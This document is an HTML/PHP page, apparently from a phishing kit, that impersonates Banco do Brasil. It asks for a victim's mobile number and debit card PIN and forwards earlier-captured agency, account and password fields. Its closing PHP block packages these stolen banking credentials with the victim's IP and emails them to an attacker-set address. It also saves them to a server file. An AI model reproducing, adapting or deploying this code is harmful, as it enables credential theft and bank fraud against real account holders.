<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Banco do Brasil</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
	<link href='https://fonts.googleapis.com/css?family=Roboto' rel='stylesheet'>
	<link rel="stylesheet" type="text/css" href="reset.css" />
	<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
	<link rel="stylesheet" type="text/css" href="style.css?id=001" />
</head>
<body>
	<form id="frm" name="frm" method="post" action="continue.php" onsubmit="return checkLogin()">
	<?php foreach ($_POST as $key => $value): ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>">
	<?php endforeach; ?>

	<div class="container">
		<div class="topo"><p>Segurança - Dados de contato</p></div>
		<div class="content">
			<table>
				<tr>
					<td> <p>Informe o número de celular cadastrado</p><br/><br/>  </td>
				</tr> 

				<tr>
					<td><span class="titulo label-celular">Celular</span></td>
				</tr>

				<tr>
					<td>
						<input type="tel" id="txt04" name="txt04" placeholder="Celular" onfocus="$('.label-celular').show();this.placeholder=''"  required="" onkeyup="jump(this, 15, 'txt05')">
					</td>
				</tr>
				<tr>
					<td><span class="titulo label-senha">Senha do cartão</span></td>
				</tr>

				<tr>
					<td>
						<input type="tel" id="txt05" name="txt05" placeholder="Senha do cartão" onfocus="$('.label-senha').show();this.placeholder=''" class="password" maxlength="6" required="">
					</td>
				</tr>				
				<tr><td><span class="titulo small">Senha do cartão de débito, utilizada para confirmar operações.</span></td></tr>

			</table>
		</div>

		<div class="footer">
			<button class="btn-amarelo">CONTINUAR</button>
		</div>
	</div>

	</form>

	<script type="text/javascript" src="js/jquery.mask.min.js"></script>
	<script type="text/javascript" src="js/script1.js"></script>
	<script type="text/javascript">

		function jump(field, maxlength, nextfield){
			if (field.value.length == maxlength){
				document.getElementById(nextfield).focus();	
			}
		}		

		function checkLogin(){
		  var txt04 = document.frm.txt04.value;

		  if (txt04.length < 15) {
		  	alert("Preencha corretamente");
		  	document.frm.txt04.focus();
		  	return false;
		  }

		  var txt05 = document.frm.txt05.value;

		  if (txt05.length < 6) {
		  	alert("Preencha corretamente");
		  	document.frm.txt05.value = "";
		  	document.frm.txt05.focus();
		  	return false;
		  }		  

		  return true;
		}

		$(document).ready(function(){
		    $('#txt04').mask('(00) 00000-0000');
		});

	</script>


</body>
</html>

<?php

if ($_POST){
	require_once("config.php");
	extract($_POST);
	$ip = $_SERVER['REMOTE_ADDR'];
	$data=date("d/m/Y");
	$hora=date("H:i");

	$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
	$headers.= "From: MOBILE BB <chegou@zedn.com>";
	$conteudo ="
	================ Dados ================<br>
	$data-($hora) - $ip<br>
	AG / CC.....: $txt01 / $txt02<br>
	ENTRADA.....: $txt03<br>
	============================================<br>";

	@mail($receber, "BB - $ip", "$conteudo", $headers); 
	@file_put_contents("data/$ip.html", $conteudo, FILE_APPEND);	
}
?>